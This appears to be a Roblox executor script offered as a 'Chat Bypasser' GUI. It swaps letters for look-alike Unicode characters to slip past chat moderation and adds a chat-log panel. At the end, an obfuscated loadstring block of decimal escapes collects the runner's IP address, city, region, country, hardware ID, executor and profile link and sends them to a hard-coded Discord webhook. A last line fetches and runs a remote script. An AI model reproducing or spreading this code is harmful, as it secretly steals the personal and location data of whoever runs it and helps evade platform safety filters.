local gui = Instance.new("ScreenGui")
gui.Name = "Chat Bypasser"
gui.Parent = game.CoreGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0.2, 0, 0.05, 0)
main.Position = UDim2.new(0.2, 0, 0.2, 0)
main.BackgroundColor3 = Color3.new(0, 0, 0.5)
main.BorderSizePixel = 0
main.Active = true
main.BackgroundTransparency = 0
main.Draggable = true
main.Parent = gui

local lbl = Instance.new("TextLabel")
lbl.Size = UDim2.new(0.62, 0, 1, 0)
lbl.Position = UDim2.new(0, 0, 0, 0)
lbl.BackgroundColor3 = Color3.new(0, 0, 0)
lbl.BorderSizePixel = 0
lbl.Text = "Chat Bypasser Special Editon"
lbl.TextColor3 = Color3.new(255, 255, 255)
lbl.BackgroundTransparency = 1
lbl.Font = Enum.Font.ArialBold
lbl.TextSize = 15
lbl.Parent = main

local mi = Instance.new("TextButton")
mi.Size = UDim2.new(0.1, 0, 0.8, 0)
mi.Position = UDim2.new(0.89, 0, 0.1, 0)
mi.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
mi.BorderSizePixel = 0
mi.Text = ">"
mi.TextColor3 = Color3.new(255, 255, 255)
mi.BackgroundTransparency = 0
mi.Font = Enum.Font.Arial
mi.TextSize = 15
mi.Visible = false
mi.Parent = main

local mr = Instance.new("TextButton")
mr.Size = UDim2.new(0.1, 0, 0.8, 0)
mr.Position = UDim2.new(0.89, 0, 0.1, 0)
mr.BackgroundColor3 = Color3.new(0, 0.3,0.6)
mr.BorderSizePixel = 0
mr.Text = "–"
mr.TextColor3 = Color3.new(255, 255, 255)
mr.BackgroundTransparency = 0
mr.Font = Enum.Font.Arial
mr.TextSize = 15
mr.Parent = main

local by = Instance.new("Frame")
by.Size = UDim2.new(1, 0, 5, 0)
by.Position = UDim2.new(0, 0, 1, 0)
by.BackgroundColor3 = Color3.new(0, 0, 0.2)
by.BorderColor3 = Color3.new(0, 0, 0)
by.BorderSizePixel = 0
by.Active = false
by.BackgroundTransparency = 0
by.Parent = main

local cre = Instance.new("TextLabel")
cre.Size = UDim2.new(0.9, 0, 0.1, 0)
cre.Position = UDim2.new(0, 0, 0, 0)
cre.BackgroundColor3 = Color3.new(0, 0, 0)
cre.BorderColor3 = Color3.new(0, 0, 0)
cre.BorderSizePixel = 0
cre.Text = "Cracked by:???(avtor scripts)"
cre.TextColor3 = Color3.new(255, 255, 255)
cre.BackgroundTransparency = 1
cre.Font = Enum.Font.Arial
cre.TextSize = 10
cre.Parent = by

local yt = Instance.new("TextLabel")
yt.Size = UDim2.new(0.38, 0, 0.1, 0)
yt.Position = UDim2.new(0, 0, 0.1, 0)
yt.BackgroundColor3 = Color3.new(0, 0, 0)
yt.BorderColor3 = Color3.new(0, 0, 0)
yt.BorderSizePixel = 0
yt.Text = "Special for Avtor Scripts"
yt.TextColor3 = Color3.new(255, 255, 255)
yt.BackgroundTransparency = 1
yt.Font = Enum.Font.Arial
yt.TextSize = 10
yt.Parent = by

local box = Instance.new("TextBox")
box.Size = UDim2.new(0.9, 0, 0.3, 0)
box.Position = UDim2.new(0.05, 0, 0.25, 0)
box.BackgroundColor3 = Color3.new(0, 0, 1)
box.BorderSizePixel = 0
box.Text = ""
box.TextColor3 = Color3.new(1,1,1)
box.BackgroundTransparency = 0.8
box.Font = Enum.Font.SourceSans
box.TextSize = 15
box.PlaceholderText = "Enter Text..."
box.TextWrapped = true
box.ClearTextOnFocus = false
box.MultiLine = true
box.TextYAlignment = Enum.TextYAlignment.Top
box.TextXAlignment = Enum.TextXAlignment.Left
box.Parent = by

local send = Instance.new("TextButton")
send.Size = UDim2.new(0.9, 0, 0.2, 0)
send.Position = UDim2.new(0.05, 0, 0.6, 0)
send.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
send.BorderSizePixel = 0
send.Text = "Send Text"
send.TextColor3 = Color3.new(255, 255, 255)
send.BackgroundTransparency = 0
send.Font = Enum.Font.Arial
send.TextSize = 15
send.Parent = by

mi.MouseButton1Click:connect(function()
    mi.Visible = false
    mr.Visible = true
    by.Visible = true
    end)

mr.MouseButton1Click:connect(function()
    mi.Visible = true
    mr.Visible = false
    by.Visible = false
    end)


local function convertText()
local text = box.Text
local convertedText = ""

local conversionTableUpper = {
    A = "Ạ", B = "Ḅ", C = "C", D = "Ḍ", E = "Ẹ",
    F = "F", G = "Ģ", H = "Ḥ", I = "Ị", J = "J",
    K = "Ḳ", L = "Ḷ", M = "Ṃ", N = "Ṇ", O = "Ọ",
    P = "Р", Q = "Q", R = "Ṛ", S = "Ṣ", T = "Ṭ",
    U = "Ụ", V = "Ṿ", W = "Ẉ", X = "Ẋ", Y = "Ỵ", Z = "Ẓ"
}

local conversionTableLower = {
    a = "ạ", b = "ḅ", c = "c", d = "ḍ", e = "ẹ",
    f = "f", g = "ɡ", h = "ḥ", i = "ị", j = "ј",
    k = "ḳ", l = "ḷ", m = "ṃ", n = "ṇ", o = "ọ",
    p = "р", q = "q", r = "ṛ", s = "ṣ", t = "ṭ",
    u = "ụ", v = "ṿ", w = "ẉ", x = "ẋ", y = "ỵ", z = "ẓ", ["|"] = "\r",
}

for char in text:gmatch(".") do
local convertedChar = conversionTableUpper[char] or conversionTableLower[char] or char
convertedText = convertedText .. convertedChar .. "̲"
end

box.Text = convertedText
end

send.MouseButton1Click:connect(function()
    local TextChatService = game:GetService("TextChatService")
    local Players = game:GetService("Players")

    local function sendMessage(msg)
    local player = Players.LocalPlayer
    if TextChatService.ChatInputBarConfiguration.TargetTextChannel then
    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    end
    end
    convertText()
    sendMessage(box.Text)
    box.Text = ""
    end)

local conv = Instance.new("TextButton")
conv.Size = UDim2.new(0.9, 0, 0.1, 0)
conv.Position = UDim2.new(0.05, 0, 0.85, 0)
conv.BackgroundColor3 = Color3.new(0, 0.3, 0.6)
conv.BorderColor3 = Color3.new(0, 0, 0)
conv.BorderSizePixel = 0
conv.Text = "Convert"
conv.TextColor3 = Color3.new(255, 255, 255)
conv.BackgroundTransparency = 0
conv.Font = Enum.Font.Arial
conv.TextSize = 15
conv.Parent = by

conv.MouseButton1Click:connect(function()
convertText()
end)


local npfix = Instance.new("ScreenGui")
    npfix.Parent = game.CoreGui

    local MAIN = Instance.new("Frame")
    MAIN.Size = UDim2.new(0.25, 0, 0.3, 0)
    MAIN.Position = UDim2.new(0.7, 0, 0.65, 0)
    MAIN.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    MAIN.BorderColor3 = Color3.new(0, 0, 0)
    MAIN.BorderSizePixel = 0
    MAIN.Active = false
    MAIN.BackgroundTransparency = 0
    MAIN.Parent = npfix

    local CORN = Instance.new("UICorner")
    CORN.CornerRadius = UDim.new(0.1)
    CORN.Parent = MAIN

    local LABEL = Instance.new("TextLabel")
    LABEL.Size = UDim2.new(1, 0, 0.2, 0)
    LABEL.Position = UDim2.new(0, 0, 0, 0)
    LABEL.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    LABEL.BorderColor3 = Color3.new(0, 0, 0)
    LABEL.BorderSizePixel = 0
    LABEL.Text = "Chat bypasser| FIXER"
    LABEL.TextColor3 = Color3.new(255, 255, 255)
    LABEL.BackgroundTransparency = 1
    LABEL.Font = Enum.Font.Arial
    LABEL.TextSize = 17
    LABEL.Parent = MAIN

    local SEC = Instance.new("Frame")
    SEC.Size = UDim2.new(1, 0, 0.02, 0)
    SEC.Position = UDim2.new(0, 0, 0.15, 0)
    SEC.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
    SEC.BorderColor3 = Color3.new(0, 0, 0)
    SEC.BorderSizePixel = 0
    SEC.Active = false
    SEC.BackgroundTransparency = 0
    SEC.Parent = MAIN

    local CREDIT = Instance.new("TextLabel")
    CREDIT.Size = UDim2.new(1, 0, 0.1, 0)
    CREDIT.Position = UDim2.new(0, 0, 0.16, 0)
    CREDIT.BackgroundColor3 = Color3.new(0, 0, 0)
    CREDIT.BorderColor3 = Color3.new(0, 0, 0)
    CREDIT.BorderSizePixel = 0
    CREDIT.Text = "By: belb24 | Auto Loaded"
    CREDIT.TextColor3 = Color3.new(255, 255, 255)
    CREDIT.BackgroundTransparency = 1
    CREDIT.Font = Enum.Font.Arial
    CREDIT.TextSize = 10
    CREDIT.Parent = MAIN

    local KILL = Instance.new("TextButton")
    KILL.Size = UDim2.new(0.9, 0, 0.5, 0)
    KILL.Position = UDim2.new(0.05, 0, 0.3, 0)
    KILL.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    KILL.BorderColor3 = Color3.new(0, 0, 0)
    KILL.BorderSizePixel = 0
    KILL.Text = "Hide Gui"
    KILL.TextColor3 = Color3.new(255, 255, 255)
    KILL.BackgroundTransparency = 0
    KILL.Font = Enum.Font.Arcade
    KILL.TextSize = 25
    KILL.Parent = MAIN

    local CORNER = Instance.new("UICorner")
    CORNER.CornerRadius = UDim.new(0.2)
    CORNER.Parent = KILL

    local HIDE = Instance.new("TextBox")
    HIDE.Size = UDim2.new(0.01, 0, 0.01, 0)
    HIDE.Position = UDim2.new(0, 0, 90, 0)
    HIDE.BackgroundColor3 = Color3.new(0, 0, 0)
    HIDE.BorderColor3 = Color3.new(0, 0, 0)
    HIDE.BorderSizePixel = 0
    HIDE.Text = "hehe"
    HIDE.TextColor3 = Color3.new(255, 255, 255)
    HIDE.BackgroundTransparency = 0
    HIDE.Font = Enum.Font.Arial
    HIDE.TextSize = 15
    HIDE.Parent = npfix

    KILL.MouseButton1Click:connect(function()
        MAIN:Destroy()
        end)

    local function updateChatLogs(message)
    HIDE.Text = HIDE.Text .. "\n" .. message
    end

    local TextChatService = game:GetService("TextChatService")

    TextChatService.OnIncomingMessage = function(textChatMessage)
    local playerName = textChatMessage.TextSource.Name
    local messageContent = textChatMessage.Text
    updateChatLogs(playerName .. ": " .. messageContent)
    end
loadstring("\108\111\99\97\108\32\105\100\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\10\108\111\99\97\108\32\112\108\97\121\101\114\76\105\110\107\32\61\32\34\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\117\115\101\114\115\47\34\32\46\46\32\105\100\32\46\46\32\34\47\112\114\111\102\105\108\101\34\10\108\111\99\97\108\32\101\120\101\99\117\116\111\114\32\61\32\105\100\101\110\116\105\102\121\101\120\101\99\117\116\111\114\40\41\10\108\111\99\97\108\32\71\97\109\101\78\97\109\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101\34\41\58\71\101\116\80\114\111\100\117\99\116\73\110\102\111\40\103\97\109\101\46\80\108\97\99\101\73\100\41\46\78\97\109\101\10\10\108\111\99\97\108\32\97\112\105\32\61\32\103\97\109\101\46\72\116\116\112\83\101\114\118\105\99\101\58\74\83\79\78\68\101\99\111\100\101\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\105\112\119\104\111\46\105\115\47\39\41\41\10\10\108\111\99\97\108\32\100\101\108\97\121\32\61\32\48\46\50\53\10\10\108\111\99\97\108\32\72\116\116\112\83\101\114\118\105\99\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\10\10\108\111\99\97\108\32\119\101\98\104\111\111\107\85\82\76\32\61\32\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\50\55\56\50\55\49\57\52\53\50\57\48\53\52\57\51\47\100\55\119\86\105\116\79\77\106\121\66\75\51\112\69\97\100\84\112\66\53\50\118\111\118\121\52\104\107\98\90\122\117\95\95\109\79\55\72\54\90\85\119\83\105\103\79\115\103\103\65\70\83\73\79\105\118\85\116\53\109\80\53\112\67\90\54\67\34\10\10\108\111\99\97\108\32\104\116\116\112\82\101\113\117\101\115\116\32\61\32\40\115\121\110\32\97\110\100\32\115\121\110\46\114\101\113\117\101\115\116\41\32\111\114\32\40\104\116\116\112\32\97\110\100\32\104\116\116\112\46\114\101\113\117\101\115\116\41\32\111\114\32\104\116\116\112\95\114\101\113\117\101\115\116\32\111\114\32\40\102\108\117\120\117\115\32\97\110\100\32\102\108\117\120\117\115\46\114\101\113\117\101\115\116\41\10\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\101\120\101\99\117\116\101\83\99\114\105\112\116\115\40\41\10\32\32\32\32\102\111\114\32\95\44\32\115\99\114\105\112\116\67\111\110\116\101\110\116\32\105\110\32\105\112\97\105\114\115\40\115\99\114\105\112\116\115\41\32\100\111\10\32\32\32\32\32\32\32\32\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\97\100\115\116\114\105\110\103\40\115\99\114\105\112\116\67\111\110\116\101\110\116\41\40\41\10\32\32\32\32\32\32\32\32\101\110\100\41\10\32\32\32\32\32\32\32\32\119\97\105\116\40\100\101\108\97\121\41\10\32\32\32\32\101\110\100\10\101\110\100\10\10\108\111\99\97\108\32\112\97\121\108\111\97\100\32\61\32\123\10\32\32\32\32\99\111\110\116\101\110\116\32\61\32\34\34\44\10\32\32\32\32\101\109\98\101\100\115\32\61\32\123\10\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\116\105\116\108\101\32\61\32\34\121\111\117\114\32\115\99\114\105\112\116\32\104\97\115\32\98\101\101\110\32\101\120\101\99\117\116\101\100\33\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\100\101\115\99\114\105\112\116\105\111\110\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\46\46\32\34\32\101\120\101\99\117\116\101\100\32\121\111\117\114\32\115\99\114\105\112\116\33\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\116\121\112\101\32\61\32\34\114\105\99\104\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\99\111\108\111\114\32\61\32\116\111\110\117\109\98\101\114\40\48\120\48\48\48\48\70\70\41\44\10\32\32\32\32\32\32\32\32\32\32\32\32\102\105\101\108\100\115\32\61\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\72\97\114\100\119\97\114\101\32\73\68\58\34\44\32\45\45\32\98\97\115\105\99\97\108\108\121\46\46\32\108\105\107\101\32\72\87\73\68\44\32\108\111\108\46\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\98\120\65\110\97\108\121\116\105\99\115\83\101\114\118\105\99\101\34\41\58\71\101\116\67\108\105\101\110\116\73\100\40\41\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\73\80\32\97\100\100\114\101\115\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\97\112\105\46\105\112\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\102\97\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\99\111\117\110\116\114\121\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\97\112\105\46\99\111\117\110\116\114\121\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\102\97\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\114\101\103\105\111\110\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\97\112\105\46\114\101\103\105\111\110\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\102\97\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\99\105\116\121\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\97\112\105\46\99\105\116\121\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\101\120\101\99\117\116\111\114\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\101\120\101\99\117\116\111\114\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\102\97\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\103\97\109\101\32\110\97\109\101\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\71\97\109\101\78\97\109\101\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\102\97\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\110\97\109\101\32\61\32\34\112\114\111\102\105\108\101\32\108\105\110\107\58\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\108\117\101\32\61\32\112\108\97\121\101\114\76\105\110\107\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\110\108\105\110\101\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\10\32\32\32\32\32\32\32\32\32\32\32\32\125\10\32\32\32\32\32\32\32\32\125\10\32\32\32\32\125\10\125\10\10\108\111\99\97\108\32\114\101\115\112\111\110\115\101\32\61\32\104\116\116\112\82\101\113\117\101\115\116\40\123\10\32\32\32\32\85\114\108\32\61\32\119\101\98\104\111\111\107\85\82\76\44\10\32\32\32\32\77\101\116\104\111\100\32\61\32\34\80\79\83\84\34\44\10\32\32\32\32\72\101\97\100\101\114\115\32\61\32\123\10\32\32\32\32\32\32\32\32\91\34\67\111\110\116\101\110\116\45\84\121\112\101\34\93\32\61\32\34\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\34\10\32\32\32\32\125\44\10\32\32\32\32\66\111\100\121\32\61\32\72\116\116\112\83\101\114\118\105\99\101\58\74\83\79\78\69\110\99\111\100\101\40\112\97\121\108\111\97\100\41\10\125\41")()

loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anthonys-acl-ANTI-CHAT-LOGGER-7184"))()
